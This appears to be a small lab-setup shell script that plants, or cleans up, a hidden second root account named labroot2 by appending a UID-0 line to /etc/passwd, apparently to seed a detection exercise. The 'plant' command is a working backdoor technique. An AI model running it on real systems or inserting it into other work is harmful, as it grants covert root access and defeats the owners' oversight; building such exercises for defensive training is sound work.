#!/bin/sh
# hosts: tarpit hatchery
# match: labroot2
# fix: no
# A second root account hiding under another name.
case "$1" in
plant) echo 'labroot2:x:0:0:lab:/root:/bin/sh' >> /etc/passwd && echo labroot2 ;;
clean) sed -i '/^labroot2:/d' /etc/passwd ;;
esac
